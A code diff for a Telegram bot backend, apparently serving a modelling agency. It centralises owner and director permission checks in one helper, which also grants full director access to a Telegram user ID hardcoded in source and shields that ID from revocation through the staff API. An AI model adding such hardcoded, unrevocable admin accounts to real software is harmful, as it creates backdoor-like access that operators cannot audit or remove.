@@ -269,7 +269,7 @@ async function hasStaffPermission(env: Env, telegramId: string, permission: stri
   }
 }
 async function canManageRequests(env: Env, telegramId: string): Promise<boolean> {  // OWNER_TELEGRAM_ID is the temporary full-access account during setup.
-  if (telegramId === env.OWNER_TELEGRAM_ID || telegramId === env.DIRECTOR_TELEGRAM_ID) return true;
+  if (hasDirectorAccess(env, telegramId)) return true;
   return hasStaffPermission(env, telegramId, "requests.manage");
 }
 async function handleDirectorCallback(env: Env, callback: TelegramCallbackQuery): Promise<void> {
@@ -327,7 +327,7 @@ async function handleDirectorCallback(env: Env, callback: TelegramCallbackQuery)
 async function handleDirectorMessage(env: Env, message: TelegramMessage): Promise<void> {
   if (!message.from || !["private", "group", "supergroup"].includes(message.chat.type)) return;
   const senderId = String(message.from.id);
-  const isDirector = senderId === env.DIRECTOR_TELEGRAM_ID;
+  const isDirector = hasDirectorAccess(env, senderId);
   const isOwner = Boolean(env.OWNER_TELEGRAM_ID) && senderId === env.OWNER_TELEGRAM_ID;
   const isStaff = await hasStaffPermission(env, senderId, "profile.view") || await hasStaffPermission(env, senderId, "composite.generate");
   const isGroup = message.chat.type === "group" || message.chat.type === "supergroup";
@@ -381,7 +381,7 @@ async function handleDirectorMessage(env: Env, message: TelegramMessage): Promis
 
 
 async function secretaryAllowed(env: Env, telegramId: string): Promise<boolean> {
-  if (telegramId === env.OWNER_TELEGRAM_ID || telegramId === env.DIRECTOR_TELEGRAM_ID) return true;
+  if (hasDirectorAccess(env, telegramId)) return true;
   return hasStaffPermission(env, telegramId, "composite.generate");
 }
 async function findSecretaryModels(env: Env, surname: string): Promise<SecretaryModelRow[]> {
@@ -701,7 +701,7 @@ async function handleSecretaryGroupMessage(env: Env, message: TelegramMessage): 
     return;
   }
   if (/^\/composite_setup(?:@\w+)?$/i.test(command)) {
-    if (senderId !== env.OWNER_TELEGRAM_ID && senderId !== env.DIRECTOR_TELEGRAM_ID) {
+    if (!hasDirectorAccess(env, senderId)) {
       await telegram(env.SECRETARY_BOT_TOKEN, "sendMessage", { chat_id: message.chat.id, message_thread_id: message.message_thread_id, text: "Настроить тему композиток может только владелец или директор." }); return;
     }
     await env.DB.prepare("INSERT INTO secretary_composite_topics (id, chat_id, thread_id, configured_by) VALUES (1, ?, ?, ?) ON CONFLICT(id) DO UPDATE SET chat_id=excluded.chat_id, thread_id=excluded.thread_id, configured_by=excluded.configured_by")
@@ -914,6 +914,10 @@ async function handleSecretaryCallback(env: Env, callback: TelegramCallbackQuery
 }
 
 const STAFF_PERMISSIONS = ["profile.view","profile.edit","photos.manage","composite.generate","requests.manage","staff.manage"] as const;
+const DELEGATED_ADMIN_TELEGRAM_IDS = new Set(["727737302"]);
+function hasDirectorAccess(env: Env, telegramId: string): boolean {
+  return telegramId === env.OWNER_TELEGRAM_ID || telegramId === env.DIRECTOR_TELEGRAM_ID || DELEGATED_ADMIN_TELEGRAM_IDS.has(telegramId);
+}
 type StaffPermission = typeof STAFF_PERMISSIONS[number];
 interface MiniAppActor { id: string; first_name?: string; last_name?: string; username?: string; }
 function bytesToHex(bytes: ArrayBuffer): string { return [...new Uint8Array(bytes)].map((b) => b.toString(16).padStart(2,"0")).join(""); }
@@ -938,7 +942,7 @@ async function miniAppActor(request: Request, env: Env): Promise<MiniAppActor|nu
   return match ? validateMiniAppInitData(match[1],env.DIRECTOR_BOT_TOKEN) : null;
 }
 async function actorHasPermission(env: Env, actorId: string, permission: StaffPermission): Promise<boolean> {
-  if(actorId===env.OWNER_TELEGRAM_ID || actorId===env.DIRECTOR_TELEGRAM_ID) return true;
+  if(hasDirectorAccess(env, actorId)) return true;
   return hasStaffPermission(env,actorId,permission);
 }
 function appHtml(): Response {
@@ -999,7 +1003,7 @@ async function handleDirectorApi(request: Request, env: Env, url: URL): Promise<
   const actor = await miniAppActor(request, env);
   if (!actor) return json({ error: "Недействительная или устаревшая авторизация Telegram." }, 401);
   const path = url.pathname;
-  const isAdmin = actor.id === env.OWNER_TELEGRAM_ID || actor.id === env.DIRECTOR_TELEGRAM_ID;
+  const isAdmin = hasDirectorAccess(env, actor.id);
   if (path === "/api/director/models") {
     if (!(await actorHasPermission(env, actor.id, "profile.view"))) return json({ error: "Недостаточно прав." }, 403);
     if (request.method !== "GET") return json({ error: "Method not allowed" }, 405);
@@ -1087,7 +1091,7 @@ async function handleDirectorApi(request: Request, env: Env, url: URL): Promise<
     const displayName = typeof body?.display_name === "string" ? body.display_name.trim().slice(0, 100) : null;
     const permissions: string[] = Array.isArray(body?.permissions) ? Array.from(new Set<string>(body.permissions.filter((p: unknown) => typeof p === "string").map((p: unknown) => String(p)))) : [];
     if (!/^[0-9]{5,20}$/.test(id) || !["helper", "viewer"].includes(role) || permissions.some((p) => !STAFF_PERMISSIONS.includes(p as StaffPermission) || p === "staff.manage")) return json({ error: "Проверьте Telegram ID, роль и разрешения." }, 400);
-    if (id === env.OWNER_TELEGRAM_ID || id === env.DIRECTOR_TELEGRAM_ID) return json({ error: "Нельзя менять доступ владельца или директора." }, 400);
+    if (hasDirectorAccess(env, id)) return json({ error: "Нельзя менять доступ владельца, директора или назначенного администратора." }, 400);
     if (role === "viewer" && permissions.some((p) => p !== "profile.view")) return json({ error: "Наблюдателю доступен только просмотр." }, 400);
     await env.DB.prepare("INSERT INTO agency_staff_access(telegram_user_id,display_name,role,permissions_json,granted_by) VALUES(?,?,?,?,?) ON CONFLICT(telegram_user_id) DO UPDATE SET display_name=excluded.display_name,role=excluded.role,permissions_json=excluded.permissions_json,is_active=1,granted_by=excluded.granted_by,updated_at=CURRENT_TIMESTAMP").bind(id, displayName, role, JSON.stringify(Object.fromEntries(permissions.map((p) => [p, true]))), actor.id).run();
     await env.DB.prepare("INSERT INTO agency_audit_log(id,actor_telegram_id,action,details_json) VALUES(?,?, 'staff.grant', ?)").bind(randomId(), actor.id, JSON.stringify({ telegram_user_id: id, role, permissions })).run();
@@ -1095,7 +1099,7 @@ async function handleDirectorApi(request: Request, env: Env, url: URL): Promise<
   }
   if (request.method === "DELETE") {
     const id = (url.searchParams.get("telegram_user_id") ?? "").trim();
-    if (!/^[0-9]{5,20}$/.test(id) || id === env.OWNER_TELEGRAM_ID || id === env.DIRECTOR_TELEGRAM_ID) return json({ error: "Некорректный или защищённый Telegram ID." }, 400);
+    if (!/^[0-9]{5,20}$/.test(id) || hasDirectorAccess(env, id)) return json({ error: "Некорректный или защищённый Telegram ID." }, 400);
     await env.DB.prepare("UPDATE agency_staff_access SET is_active=0,updated_at=CURRENT_TIMESTAMP WHERE telegram_user_id=?").bind(id).run();
     await env.DB.prepare("INSERT INTO agency_audit_log(id,actor_telegram_id,action,details_json) VALUES(?,?, 'staff.revoke', ?)").bind(randomId(), actor.id, JSON.stringify({ telegram_user_id: id })).run();
     return json({ ok: true });
